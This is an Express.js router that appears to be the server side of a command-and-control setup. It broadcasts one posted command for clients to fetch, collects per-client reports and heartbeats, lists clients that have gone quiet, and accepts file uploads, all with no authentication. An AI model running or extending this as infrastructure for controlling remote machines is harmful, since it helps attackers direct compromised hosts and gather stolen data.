var express = require('express');
var router = express.Router();
var htmlize = require('json-htmlize');

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Command' });
});

router.post('/command', function (req, res, next) {
    console.log(req.body);
    req.app.locals.command = req.body.command;
    res.render('success');
});

router.get('/command', function(req, res, next) {
    res.send(req.app.locals.command);
});

router.post('/report', function(req, res, next) {
    req.app.locals.report[req.body.id] = { content: req.body.content, 'last-tick': Date.now()};
    res.sendStatus(200);
});

router.get('/report', function (req, res) {
    var htmlString = htmlize.toHtmlString(req.app.locals.report || "");
    res.end("<body>" + htmlString + "</body>");
});

router.get('/alive', function (req, res) {
    var tmp = {};
    var rep = (req.app.locals.report || {});
    for ( var key in rep) {
        if (Date.now() - rep[key]['last-tick'] > 60000) {
            tmp[key] = rep[key];
        }
    }
    var htmlString = htmlize.toHtmlString(tmp);
    res.end("<body>" + htmlString + "</body>");
});

router.post('/tick', function(req, res) {
    var rep = (req.app.locals.report || {});
    rep[req.body.id]['last-tick'] = Date.now();
    res.sendStatus(200);
});

router.get('/fq', function(req, res) {
    res.end('64ac9ed3f12fcfc437c9b564d71d2f34');
});

router.get('/upload', function(req, res) {
    res.render('upload');
});

router.post('/upload', function(req, res) {
    console.log(req.body);
    console.log(req.files);
    res.sendStatus(200);
});

module.exports = router;
